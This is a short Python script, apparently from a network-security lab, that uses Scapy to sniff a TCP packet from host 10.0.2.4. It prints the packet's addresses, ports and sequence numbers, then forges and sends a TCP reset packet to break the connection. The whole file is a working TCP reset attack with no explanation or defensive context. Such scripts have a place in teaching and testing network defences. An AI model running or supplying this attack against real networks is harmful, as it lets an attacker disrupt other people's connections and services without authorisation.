#!/usr/bin/python3
from scapy.all import * 

def reset_attack(pkt):
	print ("Source IP: ", pkt[IP].src)
	print ("Source port: ", pkt[TCP].sport)
	print ("Destination IP: ", pkt[IP].dst)
	print ("Destination port: " , pkt[TCP].dport)
	print ("TCP Segment length: ", len(pkt[TCP].payload))
	print ("Sequence number: ", pkt[TCP].seq)
	print ("Next sequence number: ", pkt[TCP].seq + len(pkt[TCP].payload))
	print ("Ack: ", pkt[TCP].ack)

	ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
	tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="R", seq=pkt[TCP].seq + len(pkt[TCP].payload))
	rst_pkt = ip/tcp
	send(rst_pkt)
	print ("\n")

pkt = sniff(filter='tcp and src host 10.0.2.4', prn=reset_attack, count=1)